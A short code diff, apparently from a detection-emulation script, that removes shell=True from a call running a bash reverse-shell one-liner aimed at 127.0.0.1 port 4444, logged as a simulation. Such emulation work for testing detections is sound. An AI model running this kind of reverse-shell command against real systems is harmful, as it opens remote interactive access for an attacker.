@@ -21,4 +21,4 @@ log = logging.getLogger(__name__)
 )
 def main():
     log.info("Executing command to simulate reverse shell execution")
-    _ = _common.execute_command(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)
+    _ = _common.execute_command(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'])
